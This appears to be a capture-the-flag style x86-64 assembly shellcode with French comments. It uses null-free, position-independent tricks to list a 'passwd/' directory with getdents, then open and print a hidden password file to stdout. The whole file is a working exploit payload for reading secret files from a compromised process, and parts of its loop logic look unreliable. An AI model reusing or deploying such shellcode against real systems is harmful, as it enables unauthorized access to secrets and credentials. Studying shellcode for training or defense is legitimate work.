BITS 64
global _start

_start:
jmp _push_filename

_readfile:
;open("passwd/", 0, 0)
pop rdi				;rdi = "passwd/\n"
xor byte [rdi + 7], 0x41	;fix \n
xor rdx, rdx
xor rsi, rsi
xor rax, rax
add al, 2
syscall

;getdents(fd, rsp, 0xFF)
mov rdi, rax                    ;fd
xor rdx, rdx
mov dl, 0xff                    ;rdx = 0xFF
sub rsp, rdx                    ;taille de la room
mov rsi, rsp
xor rax, rax
add al, 78
syscall

mov r8, rax

_readbuffer:
mov r9, [rsp + 16]		;taille dirent
and r9, 0x0000FFFF
mov r10, rsp
add r10, 18			;filename
xor r11, r11

.LOOP:
inc r11
cmp byte [r10 + r11], 0
jne .LOOP

mov r13, qword [r10]

;write(1, rsp, r11)
mov rdx, r11
xor rdi, rdi
inc rdi                         ;stdout
mov rsi, r10
xor rax, rax
mov r15, rsp			;sauvegarde avant saut à la ligne
inc rax
syscall

;write(1, rsp ,1) 		;retour à la ligne
mov byte [rsp], 0x0a
mov rdx, 1
mov rsi, rsp
xor rdi, rdi
inc rdi
xor rax, rax
inc rax
syscall

mov rsp, r15			;restaure rsp au debut du dirent
mov r9, [rsp + 16]		;taille du dirent
and r9, 0x0000FFFF
add rsp, r9			;pointe sur le prochain dirent

cmp r10, 200
ja _OPEN

jmp _readbuffer

_OPEN:
add rsp, 0xff

;open(".passwd_xXx", 0, 0)
xor rax, rax
mov al, 2
mov rdi, r13
xor rsi, rsi
xor rdx, rdx
syscall

;read(fd, rsp, 0x32)
mov rdi, rax
xor rdx, rdx
mov dl, 0x32
sub rsp, rdx
mov rsi, rsp
xor rax, rax
syscall

xchg rax, rdx

;write(1, rsp, 0xFF)
xor rdi, rdi
inc rdi                         ;stdout
mov rsi, rsp
xor rax, rax
inc rax
;mov rdx, r11
syscall

.END:
;close()
xor rax, rax
add al, 60
syscall

_push_filename:
call _readfile
path: db "passwd/A"
